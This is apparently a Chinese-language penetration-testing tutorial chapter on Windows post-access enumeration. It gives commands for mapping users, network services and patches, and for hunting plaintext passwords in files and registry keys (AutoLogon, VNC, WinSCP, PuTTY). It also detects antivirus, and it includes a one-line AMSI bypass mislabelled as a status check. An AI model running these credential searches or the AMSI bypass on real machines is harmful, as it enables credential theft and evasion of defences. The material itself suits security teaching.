## 學習目標

- 系統性列舉 Windows 機器上的所有潛在提權面。
- 找出檔案系統中的敏感資訊（密碼、設定檔、憑證）。
- 辨識網路服務、開放埠、連線狀態。
- 確認 AV/EDR 和安全機制，調整攻擊策略。

---

## 理論基礎：本機列舉的目標

進入機器後，列舉的目的是找到**提權的起點**，常見來源：

1. 檔案系統 → 設定檔有明文密碼、未加密的備份
2. 服務 → 設定錯誤（第83章）、弱 ACL
3. 排程工作 → 可覆蓋的執行檔（第84章）
4. 登錄檔 → 明文密碼、自動執行位置
5. 網路 → 內部服務、其他機器、防火牆規則
6. 應用程式 → 舊版軟體漏洞、弱密碼

## 系統基本資訊

```cmd
:: OS 版本（判斷核心漏洞）
systeminfo
winver

:: 精簡版
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

:: 已安裝更新（找 patch 缺口）
wmic qfe list brief
:: qfe = Quick Fix Engineering（hotfix）
:: 重點：缺少哪些安全更新

:: 安裝的軟體（找已知漏洞版本）
wmic product get name,version
:: 或
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s /v DisplayName
:: /s → 遞迴查子機碼
:: /v DisplayName → 只顯示 DisplayName 值
```

## 使用者與群組

```cmd
:: 所有本機帳號
net user

:: 帳號詳細資訊
net user USERNAME
:: 重點：Password last set / Never expires / Local Group Memberships

:: 所有本機群組
net localgroup

:: 管理員群組成員
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"

:: 當前登入使用者
query user
query session

:: PowerShell 版（更詳細）
Get-LocalUser | Select Name, Enabled, LastLogon, PasswordRequired
Get-LocalGroupMember -Group "Administrators"
```

## 網路資訊

```cmd
:: 網路介面和 IP
ipconfig /all
:: /all → 包含 MAC、DHCP、DNS 伺服器

:: 路由表（找內部網段）
route print
netstat -r

:: 監聽的 Port（找內部服務）
netstat -ano
:: -a → 所有連線（包含監聽）
:: -n → 用數字顯示 IP（不做 DNS 解析，更快）
:: -o → 顯示 PID（配合 tasklist 找對應程式）

:: 找正在監聽且只綁定 127.0.0.1 的服務（只有本機能連，port forward 後可利用）
netstat -ano | findstr "LISTENING"

:: 配合 PID 找程式名稱
tasklist /FI "PID eq 1234"
:: /FI → 過濾條件

:: 防火牆規則
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all
```

## 磁碟和檔案搜尋

```powershell
# 找包含 "password" 的檔案名稱
Get-ChildItem -Path C:\ -Recurse -Include "*password*","*pass*","*cred*" -ErrorAction SilentlyContinue
# -Recurse          → 遞迴搜尋
# -Include          → 文件名稱 pattern（可多個）
# -ErrorAction SilentlyContinue → 跳過存取被拒的錯誤

# 找檔案內容含 password 的檔案
Select-String -Path C:\Users\*\Documents\* -Pattern "password|passwd|pwd" -Recurse
# -Pattern → 正規表達式（可用 | 表示 OR）

# cmd 版本
findstr /si /m "password" *.txt *.xml *.ini *.config *.bat
# /s → 遞迴
# /i → 不區分大小寫
# /m → 只顯示檔案名稱（不顯示匹配行）

# 找常見設定檔位置
dir /s /b C:\*.config C:\*.xml C:\*.ini 2>nul | findstr /i "web app unattend"
# /s → 遞迴
# /b → 只顯示路徑（不顯示目錄標頭）

# 重點目標位置
Get-Content "C:\Windows\System32\drivers\etc\hosts"
Get-ChildItem -Path "C:\Users" -Recurse -Include "*.txt","*.xml","*.config" | Select-String -Pattern "password"
Get-ChildItem "C:\Program Files" -Recurse -Include "*.config","web.config" -ErrorAction SilentlyContinue
```

## 登錄檔找密碼

```cmd
:: AutoLogon 帳號密碼（明文存在登錄檔）
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: 找 AutoAdminLogon / DefaultUserName / DefaultPassword

:: 尋找 VNC 密碼
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

:: 已儲存的 RDP 憑證
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s

:: WinSCP 密碼
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s

:: PuTTY session
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

:: 所有 password 相關的 registry key（大範圍搜）
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
:: /f password → 搜尋包含 "password" 的值名稱或內容
:: /t REG_SZ   → 只查字串類型
:: /s          → 遞迴搜尋子機碼
```

## AV / EDR 偵測

```cmd
:: 查 Windows Defender 狀態
sc query windefend
:: state: RUNNING → 啟用中

:: 查其他防毒
sc query type= all | findstr /i "defender norton mcafee kaspersky crowdstrike"

:: PowerShell 查 AV
Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled
# AntivirusEnabled = True → Defender 啟用

:: 查 AMSI（PowerShell 防惡意腳本）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 不合法使用，了解原理即可

:: 查 AppLocker 策略
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```
